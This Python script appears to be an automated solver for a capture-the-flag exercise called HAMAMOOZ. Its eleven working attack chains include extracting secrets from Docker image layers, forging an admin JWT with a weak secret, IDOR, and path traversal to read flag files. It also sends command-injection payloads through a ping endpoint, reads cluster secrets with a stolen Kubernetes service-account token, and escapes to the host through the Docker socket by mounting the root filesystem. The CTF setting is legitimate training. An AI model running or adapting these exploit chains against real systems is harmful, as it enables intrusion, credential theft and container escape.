#!/usr/bin/env python3

import argparse
import base64
import json
import os
import re
import shutil
import subprocess
import tarfile
from pathlib import Path

import requests

FLAG_RE = re.compile(r"HAMAMOOZ\{[^}]+\}")

DEFAULT_IMAGE = "hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend"
DEFAULT_SECRET = "changeme123"

MANIFEST_DIGEST = "e8b21b83f74dd5ef63dd264f70cb6de5d095da53834cc2c01bde346cd90d89c9"

def find_flag(text):
    if not text:
        return None
    m = FLAG_RE.search(str(text))
    return m.group(0) if m else None

def request(session, method, url, **kwargs):
    try:
        r = session.request(method, url, timeout=20, **kwargs)
        return r
    except requests.RequestException as e:
        print(f"    [!] request failed: {e}")
        return None

def diag(session, base, command):
    r = request(
        session,
        "POST",
        f"{base}/api/diag/ping",
        json={"host": command},
    )
    if not r:
        return ""
    try:
        return r.json().get("output", "")
    except Exception:
        return r.text

def flag1(image, workdir):
    print("\n[Flag 1] Docker layer secret")
    if not shutil.which("docker"):
        print("    [-] Docker CLI not found; skipping.")
        return None

    workdir = Path(workdir)
    workdir.mkdir(exist_ok=True)
    tarball = workdir / "backend.tar"
    extracted = workdir / "extracted"
    extracted.mkdir(exist_ok=True)

    try:
        if not tarball.exists():
            print(f"    [*] Saving {image} ...")
            subprocess.run(
                ["docker", "save", image, "-o", str(tarball)],
                check=True,
            )

        print("    [*] Extracting Docker archive ...")
        subprocess.run(
            ["tar", "-xf", str(tarball), "-C", str(extracted)],
            check=True,
        )

        manifest = extracted / "blobs" / "sha256" / MANIFEST_DIGEST
        if not manifest.exists():
            print(f"    [-] Manifest {MANIFEST_DIGEST} not found.")
            return None

        data = json.loads(manifest.read_text())
        layers = [
            x["digest"].split(":", 1)[1]
            for x in data.get("layers", [])
        ]

        print(f"    [*] Searching {len(layers)} layers for .env / flag ...")
        for digest in layers:
            blob = extracted / "blobs" / "sha256" / digest
            if not blob.exists():
                continue

            try:
                with tarfile.open(blob, mode="r:gz") as tf:
                    names = tf.getnames()
                    interesting = [
                        n for n in names
                        if n.endswith(".env")
                        or ".env." in n
                        or "flag" in os.path.basename(n).lower()
                    ]
                    if not interesting:
                        continue

                    print(f"    [*] Interesting layer: {digest}")
                    for name in interesting:
                        try:
                            content = tf.extractfile(name)
                            if content:
                                text = content.read().decode("utf-8", errors="replace")
                                flag = find_flag(text)
                                if flag:
                                    print(f"    [+] {flag}")
                                    return flag
                        except Exception:
                            pass
            except (tarfile.TarError, EOFError):
                continue

        print("    [-] Flag not found automatically in image layers.")
    except subprocess.CalledProcessError as e:
        print(f"    [-] Docker/tar failed: {e}")

    return None

def flag2(session, base, token):
    print("\n[Flag 2] Weak JWT secret + role tampering")
    if not token:
        print("    [-] No JWT supplied; use --token.")
        return None

    try:
        import jwt
        payload = jwt.decode(
            token,
            options={"verify_signature": False},
        )
        payload["role"] = "admin"
        forged = jwt.encode(payload, DEFAULT_SECRET, algorithm="HS256")
    except Exception as e:
        print(f"    [-] Could not forge JWT: {e}")
        return None

    r = request(
        session,
        "GET",
        f"{base}/admin/dashboard",
        headers={"Authorization": f"Bearer {forged}"},
    )
    if not r:
        return None

    flag = find_flag(r.text)
    print(f"    [+] {flag}" if flag else f"    [-] No flag (HTTP {r.status_code})")
    return flag

def flag3(session, base):
    print("\n[Flag 3] Debug header bypass")
    r = request(
        session,
        "GET",
        f"{base}/api/internal/flag",
        headers={"X-Debug-Mode": "true"},
    )
    if not r:
        return None

    flag = find_flag(r.text)
    print(f"    [+] {flag}" if flag else f"    [-] No flag (HTTP {r.status_code})")
    return flag

def flag4(session, base):
    print("\n[Flag 4] Exposed OpenAPI schema")
    r = request(session, "GET", f"{base}/api/schema/")
    if not r:
        return None

    flag = find_flag(r.text)
    print(f"    [+] {flag}" if flag else f"    [-] No flag (HTTP {r.status_code})")
    return flag

def flag5(session, base, token):
    print("\n[Flag 5] IDOR on org reports")
    if not token:
        print("    [-] No JWT supplied; skipping.")
        return None

    r = request(
        session,
        "GET",
        f"{base}/api/orgs/2/reports/2",
        headers={"Authorization": f"Bearer {token}"},
    )
    if not r:
        return None

    try:
        data = r.json()
        flag = find_flag(data.get("secret_note", ""))
    except Exception:
        flag = find_flag(r.text)

    print(f"    [+] {flag}" if flag else f"    [-] No flag (HTTP {r.status_code})")
    return flag

def flag6(session, base):
    print("\n[Flag 6] Directory traversal")
    r = request(
        session,
        "GET",
        f"{base}/api/reports/download",
        params={"file": "../../../../app/flag.txt"},
    )
    if not r:
        return None

    flag = find_flag(r.text)
    print(f"    [+] {flag}" if flag else f"    [-] No flag (HTTP {r.status_code})")
    return flag

def flag7(session, base):
    print("\n[Flag 7] Command injection")
    cmd = "127.0.0.1;cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"
    output = diag(session, base, cmd)
    flag = find_flag(output)
    print(f"    [+] {flag}" if flag else "    [-] No flag")
    return flag

def flag8(session, base):
    print("\n[Flag 8] Kubernetes pivot")
    cmd = (
        "127.0.0.1; "
        "kubectl exec -n internal-tools "
        "admin-panel-678d5cdbfc-kj2t7 -- cat /app/app.py"
    )
    output = diag(session, base, cmd)
    flag = find_flag(output)
    print(f"    [+] {flag}" if flag else "    [-] No flag")
    return flag

def flag9(session, base):
    print("\n[Flag 9] Cross-namespace Kubernetes Secret")
    cmd = (
        '127.0.0.1;curl -k '
        '-H "Authorization: Bearer $(cat /var/run/secrets/'
        'kubernetes.io/serviceaccount/token)" '
        'https://kubernetes.default.svc/api/v1/namespaces/'
        'ctf-secrets/secrets'
    )
    output = diag(session, base, cmd)

    flag = find_flag(output)
    if flag:
        print(f"    [+] {flag}")
        return flag

    m = re.search(r'"flag"\s*:\s*"([^"]+)"', output)
    if m:
        try:
            decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="replace")
            flag = find_flag(decoded)
            if flag:
                print(f"    [+] {flag}")
                return flag
        except Exception:
            pass

    print("    [-] No flag")
    return None

def flag10(session, base):
    print("\n[Flag 10] Privileged pod / host filesystem")
    cmd = (
        "127.0.0.1;"
        "kubectl exec -n escape-zone legacy-worker -- "
        "cat /host/var/lib/node-data/flag.txt"
    )
    output = diag(session, base, cmd)
    flag = find_flag(output)
    print(f"    [+] {flag}" if flag else "    [-] No flag")
    return flag

def flag11(session, base):
    print("\n[Flag 11] Docker socket")
    create_cmd = (
        "127.0.0.1;kubectl exec -n escape-zone legacy-worker -- "
        "curl --unix-socket /host/run/docker.sock "
        "-X POST http://localhost/containers/create "
        '-H "Content-Type: application/json" '
        '-d "{\\"Image\\":\\"hub.hamdocker.ir/alpine:3.19\\",'
        '\\"Cmd\\":[\\"sh\\",\\"-c\\",\\"cat /host/home/ubuntu/flag.txt\\"],'
        '\\"HostConfig\\":{\\"Binds\\":[\\"/:/host\\"]}}"'
    )

    create_out = diag(session, base, create_cmd)
    m = re.search(r'"Id"\s*:\s*"([^"]+)"', create_out)
    if not m:
        print("    [-] Could not obtain container ID.")
        print(f"    [debug] {create_out[:1000]}")
        return None

    container_id = m.group(1)
    print(f"    [*] Created container: {container_id}")

    start_cmd = (
        "127.0.0.1;kubectl exec -n escape-zone legacy-worker -- "
        f"curl --unix-socket /host/run/docker.sock "
        f"-X POST http://localhost/containers/{container_id}/start"
    )
    diag(session, base, start_cmd)

    logs_cmd = (
        "127.0.0.1;kubectl exec -n escape-zone legacy-worker -- "
        "curl --unix-socket /host/run/docker.sock "
        f'"http://localhost/containers/{container_id}/logs?stdout=true&stderr=true"'
    )
    logs = diag(session, base, logs_cmd)

    flag = find_flag(logs)
    print(f"    [+] {flag}" if flag else "    [-] No flag")
    return flag

def main():
    parser = argparse.ArgumentParser(description="HAMAMOOZ CTF PoC runner")
    parser.add_argument(
        "--url",
        default="https://ctf.seoeh.ir",
        help="CTF base URL",
    )
    parser.add_argument(
        "--token",
        default=os.environ.get("JWT_TOKEN"),
        help="Valid starter JWT for Flags 2 and 5",
    )
    parser.add_argument(
        "--image",
        default=DEFAULT_IMAGE,
        help="Docker image for Flag 1",
    )
    parser.add_argument(
        "--workdir",
        default="hamamooz_work",
        help="Working directory for Flag 1",
    )
    parser.add_argument(
        "--skip-docker",
        action="store_true",
        help="Skip Flag 1",
    )
    parser.add_argument(
        "--skip",
        nargs="*",
        type=int,
        default=[],
        help="Flags to skip, e.g. --skip 1 4 5",
    )
    args = parser.parse_args()

    base = args.url.rstrip("/")
    session = requests.Session()
    session.headers.update({"User-Agent": "HAMAMOOZ-CTF-PoC/1.0"})

    results = {}

    runners = {
        1: lambda: flag1(args.image, args.workdir),
        2: lambda: flag2(session, base, args.token),
        3: lambda: flag3(session, base),
        4: lambda: flag4(session, base),
        5: lambda: flag5(session, base, args.token),
        6: lambda: flag6(session, base),
        7: lambda: flag7(session, base),
        8: lambda: flag8(session, base),
        9: lambda: flag9(session, base),
        10: lambda: flag10(session, base),
        11: lambda: flag11(session, base),
    }

    print("=" * 60)
    print("HAMAMOOZ CTF automated PoC runner")
    print(f"Target: {base}")
    print("=" * 60)

    for n in range(1, 12):
        if n in args.skip or (n == 1 and args.skip_docker):
            print(f"\n[Flag {n}] skipped")
            continue

        try:
            results[n] = runners[n]()
        except KeyboardInterrupt:
            print("\n[!] Interrupted.")
            break
        except Exception as e:
            print(f"    [!] Flag {n} raised: {type(e).__name__}: {e}")
            results[n] = None

    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)

    for n in range(1, 12):
        flag = results.get(n)
        print(f"Flag {n:2}: {flag or 'not found'}")

if __name__ == "__main__":
    main()
